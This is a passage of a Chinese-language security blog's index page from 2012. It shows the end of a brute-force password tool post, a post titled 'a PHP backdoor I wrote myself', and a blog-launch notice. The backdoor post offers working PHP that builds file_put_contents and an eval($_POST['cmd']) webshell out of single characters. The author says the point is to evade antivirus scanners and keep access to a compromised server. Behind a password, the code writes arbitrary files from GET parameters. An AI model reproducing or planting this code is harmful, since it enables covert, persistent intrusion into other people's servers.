 <span class="keyword">echo</span> <span class="string">'密码是：'</span>.<span class="variable">$fpwd</span>.<span class="string">'已经保存到pwd.txt文件中'</span>;
 <span class="keyword">return</span> ;
 }

}
<span class="comment">//关闭资源接口</span>
curl_close(<span class="variable">$curl</span>);
<span class="comment">//关闭文件句柄释放资源</span>
fclose(<span class="variable">$file</span>);
</pre></td></tr></table></figure>

<h2 id="-more-">
      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/html/2012-07-01-无验证码web爆破工具.html#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2012-07-01-自己写的一个php后门.html">自己写的一个PHP后门</a></h1>
  

      <time datetime="2012-07-01T04:58:04.000Z"><a href="/html/2012-07-01-自己写的一个php后门.html">7月 1 2012</a></time>
      
  </header>
    <div class="entry">
      
        <p>今天去连接很久以前的一个shell(目的是做个实验)结果~~被人改密码了。 好吧，你丫的改，看看我怎么收拾你。</p>
<p>所以就想写一个后门，为啥呢？省的又被改或者删了呗，现在的大马带有后门检测功能。所以为了防止被杀。。。。</p>
<p>其实这个后门的思路是来自之前在思派尔工作的头，他当时给我看了一个别人的后门结果一看真的很猥琐，</p>
<p>全部用连接符连接起来的字符串查杀木马的程序在强大也不可能把这个查出来的，所有就有了今天这个后门。</p>
<h3 id="-">代码：</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="code"><pre>
<span class="preprocessor">&lt;?php</span>
<span class="comment">/*
 * PHP后门程序
 * 使用说明：此程序默认会在当前目录下生成一句话cmd.php密码cmd
 * 不含有任何敏感函数有它也查不出来所以免杀是必然的。生成的一句
 * 不是免杀的，要免杀原理已经能看到了，自行处理。
 * 亲，使用的时候注意删除这里的注释~~
 * BY: Return Data:2012.6.29
 */</span>
<span class="function"><span class="keyword">function</span> <span class="title">scm</span><span class="params">()</span>{</span>
 <span class="variable">$pod</span> = <span class="string">'123'</span>; <span class="comment">//密码</span>
 <span class="variable">$_GET</span>[<span class="string">'ct'</span>] == <span class="variable">$pod</span> ? <span class="string">''</span> : <span class="keyword">exit</span>();
 <span class="variable">$fcn</span> = <span class="string">'f'</span>.<span class="string">'i'</span>.<span class="string">'l'</span>.<span class="string">'e'</span>.<span class="string">'_'</span>.<span class="string">'p'</span>.<span class="string">'u'</span>.<span class="string">'t'</span>.<span class="string">'_'</span>.<span class="string">'c'</span>.<span class="string">'o'</span>.<span class="string">'n'</span>.<span class="string">'t'</span>.<span class="string">'e'</span>.<span class="string">'n'</span>.<span class="string">'t'</span>.<span class="string">'s'</span>;
 <span class="keyword">if</span>(@<span class="variable">$_GET</span>[<span class="string">'sf'</span>]==<span class="string">'yes'</span>){
 <span class="variable">$fnm</span> = <span class="variable">$_GET</span>[<span class="string">'filepath'</span>];
 <span class="variable">$fct</span> = <span class="variable">$_GET</span>[<span class="string">'content'</span>];
 }<span class="keyword">else</span>{
 <span class="variable">$fnm</span> = <span class="string">'c'</span>.<span class="string">'m'</span>.<span class="string">'d'</span>.<span class="string">'.'</span>.<span class="string">'p'</span>.<span class="string">'h'</span>.<span class="string">'p'</span>;
 <span class="variable">$fct</span> = <span class="string">'&lt;'</span>.<span class="string">'?'</span>.<span class="string">'p'</span>.<span class="string">'h'</span>.<span class="string">'p'</span>.<span class="string">' @'</span>.<span class="string">'e'</span>.<span class="string">'v'</span>.<span class="string">'a'</span>.<span class="string">'l'</span>.<span class="string">'('</span>.<span class="string">'$'</span>.<span class="string">'_'</span>.<span class="string">'P'</span>.<span class="string">'O'</span>.<span class="string">'S'</span>.<span class="string">'T'</span>.<span class="string">'['</span>.<span class="string">'&quot;'</span>.<span class="string">'c'</span>.<span class="string">'m'</span>.<span class="string">'d'</span>.<span class="string">'&quot;'</span>.<span class="string">']'</span>.<span class="string">')'</span>.<span class="string">'?'</span>.<span class="string">'&gt;'</span>;
 }
 @<span class="variable">$fcn</span>(<span class="variable">$fnm</span>, <span class="variable">$fct</span>);
 <span class="keyword">echo</span> <span class="string">'succeed!'</span>;
}
scm();
<span class="preprocessor">?&gt;</span>
</pre></td></tr></table></figure>

<p>
      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/html/2012-07-01-自己写的一个php后门.html#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2012-07-01-新开博客.html">博客开通了~</a></h1>
  

      <time datetime="2012-06-30T16:55:36.000Z"><a href="/html/2012-07-01-新开博客.html">7月 1 2012</a></time>
      
  </header>
    <div class="entry">
      
        <h2 id="-">新开博客</h2>
<p>一直打算开个博客记录下自己学习中的一些东西，以前一直存放在电脑上面。</p>
<p>但经历了两次硬盘事件后，怕了，必须得弄个博客了要不然资料和学习日记都丢了，</p>
<p>真实相当悲剧~~</p>
<p>前期先转载一些别人的文章丰富下自己的博客内容</p>
<p>专注互联网开发技术、注重互联网安全技术。</p>
<h3 id="by-return-2012-7-1">BY: Return   2012.7.1</h3>

	 
	     <p style="margin:20px 0; color:#9f9f9f; font-size:12px;">
<span>Posted by <a style="color:#9f9f9f;" href="null"><strong>creturn</strong></a> - 7月 1 2012</span><br />
<span style="line-height:13px;">如需转载，请注明： 本文来自 <a style="color:#9f9f9f;" href="http://creturn.com"><strong>Return&#39;s Blog </strong></a></span>
</p>
       	 
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  

  <nav id="pagination">
  
  
</nav>
</div>
    </div>
    <div class="tabbar" onload="divideTabBar()">
	
      <div class="tabbaritem"><a class="next" href="/">Home</a></div>
    
      <div class="tabbaritem"><a class="next" href="/archives/">Archives</a></div>
    
      <div class="tabbaritem"><a class="next" href="/about/">About</a></div>
    
</div>


  </div>
</body>
</html>